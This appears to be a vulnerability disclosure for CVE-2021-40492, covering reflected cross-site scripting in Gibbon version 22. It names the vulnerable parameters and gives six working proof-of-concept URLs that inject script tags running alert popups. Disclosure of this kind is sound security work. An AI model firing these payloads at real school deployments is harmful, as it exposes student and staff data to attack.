# CVE-2021-40492
CVE-2021-40492 Gibbon version 22 Reflected Cross Site Scripting (XSS) Vulnerabilities.  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40492

A reflected Cross Site Scripting vulnerability exists in multiple pages in version 22 of the Gibbon education application that allows for arbitrary execution of JavaScript commands. 

Vulnerable Parameters : gibbonCourseClassID, gibbonPersonID, subpage, currentDate, allStudents


Vulnerable Payloads:

/gibbonedu/index.php?q=%2Fmodules%2FFormal+Assessment%2FexternalAssessment_details.php&gibbonPersonID=0000001819d7gdw'%3e%3cscript%3ealert(1)%3c%2fscript%3eckbcl&search=&allStudents= 

/gibbonedu/index.php?q=%2fmodules%2fDepartments%2fdepartment_course_class.php&gibbonCourseClassID=00002425sbh6q%22%3e%3cscript%3ealert(XSS)%3c%2fscript%3ezdb7w 

/gibbonedu/index.php?q=%2Fmodules%2FFormal+Assessment%2FexternalAssessment_details.php&gibbonPersonID=0000001819&search=k7zkk'%3e%3cscript%3ealert(XSS)%3c%2fscript%3eiqdj2&allStudents= 

/gibbonedu/index.php?q=%2fmodules%2fPlanner%2fplanner.php&gibbonCourseClassID=00002425%7d%7dih0ol'%3e%3cscript%3ealert(XSS)%3c%2fscript%3eadssq&viewBy=class

/gibbonedu/index.php?q=%2fmodules%2fStudents%2fstudent_view_details.php&gibbonPersonID=2033&search=&allStudents=on&sort=surname%2c%20preferredName&subpage=Familyjxlcj%3cscript%3ealert(XSS)%3c%2fscript%3emn58l

/gibbonedu/index.php?q=%2fmodules%2fDepartments%2fdepartment_course_class.php&gibbonCourseClassID=00002425&currentDate=k9q4m%22%3e%3cscript%3ealert(XSS)%3c%2fscript%3etfuh1


Found 2 Sept 2021 by Brian Lowe
